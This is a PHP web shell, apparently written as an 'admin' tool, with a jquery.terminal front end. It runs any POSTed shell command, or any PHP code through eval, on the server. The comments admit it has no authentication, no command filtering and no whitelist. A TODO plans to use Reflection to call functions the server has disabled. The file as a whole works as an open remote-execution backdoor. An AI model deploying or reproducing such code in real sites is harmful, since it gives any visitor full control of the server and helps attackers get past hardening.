<?php
/**
 * @author xiaofeng
 * @time 2015-09-27
 *
 * jquery.terminal
 * easy admin web shell
 *
 * 使用jquery.terminal插件构建的简单的后台管理用的简单webshell
 * 注意：
 * 只在vagrant ubuntu server 14 上测试通过
 * 只处理了当前目录问题
 * 未做shell命令注入过滤
 * 需要做可执行命令的白名单
 * 需要做登录权限认证
 * ......
 *
 * 2015-10-9
 * bugfix 对命令进行htmlEntityDecode，可以使用如下命令
 * curl -X POST -d '{"start_time":1444271999}' http://path
 * feature 添加eval
 * eval return 1 + 1;
 * eval echo 'hello';
 *
 * TODO:
 * 添加Relefction执行被禁止函数
 */
require 'Shell.php';

// 用户名与主机名
// $user@$hostname:$cwd$ ps aux
$user = get_current_user();
$hostname = gethostname();

// 当前目录
$cwd = filter_input(INPUT_COOKIE, 'cwd', FILTER_SANITIZE_STRING);
if($cwd === false || $cwd === null) {
	$cwd = getcwd();
}

$isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH'])
	&& $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest';

if($isAjax) {
	// 命令 未过滤
	$cmd = filter_input(INPUT_POST, 'cmd'/*, FILTER_SANITIZE_STRING*/);

	$cd = false;

	// 处理cd命令
	if(preg_match('/cd\s(.*)/', $cmd, $matches)) {
		if($matches[1][0] === '/') {
			$cwd = $matches[1];
		} else if($matches[1][0] === '~') {
			// FIXME
			// 处理家目录
		} else if(substr($matches[1], 0, 2) === '..') {
			$cwd = $cwd . '/../';
		} else {
			$cwd = $cwd . '/' . $matches[1];
		}

		if(is_dir($cwd)) {
			$cd = true;
			$cwd = realpath($cwd);
			// 通过cookie保存当前目录
			setcookie('cwd', $cwd);
		}
	}

	if(is_dir($cwd)) {
		chdir($cwd);
	}

	// 执行命令返回结果
	$res = '';
	switch(true) {
		case $cmd && (strcasecmp('eval ', substr($cmd, 0, strlen('eval '))) === 0):
			ob_start();
			$res = eval(Shell::htmlEntityDecode(trim(substr($cmd, strlen('eval ')))));
			$buf = ob_get_clean();
			if($res === false && ($error = error_get_last())) {
				$res = $error['message'];
			} else if($buf){
				$res .= PHP_EOL . $buf;
			}
			break;
		case $cmd:
			$res = $cd ? '' : Shell::exec($cmd);
			break;
	}

	exit(json_encode([
		'res' => $res,
		'cwd' => $cwd,
	], JSON_UNESCAPED_UNICODE));
}
?>
<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8" />
	<title>Shell</title>
	<link href="./css/jquery.terminal.css" rel="stylesheet"/>
	<script src="./js/jquery-1.7.1.min.js"></script>
	<script src="./js/jquery.mousewheel-min.js"></script>
	<script src="./js/jquery.terminal-min.js"></script>
</head>
<body>

<script>
$(function() {
	$('body').terminal(function(command, term) {
		term.pause();
		$.ajax({
			// url: "/",
			type: "POST",
			data: {
				cmd : command
			},
			dataType: "json"
		}).always(function() {
			term.resume();
		}).done(function(ret) {
			term.echo(ret.res);
			term.set_prompt('<?php echo "{$user}@{$hostname}:"?>' + ret.cwd + '$ ');
		}).fail(function() {
			term.error('server error');
		});
	}, {
		greetings: false,
		prompt: '<?php echo "{$user}@{$hostname}:{$cwd}$ "?>',
		name: 'shell',
		onBlur: function() { return false; }
	});
});
</script>
</body>
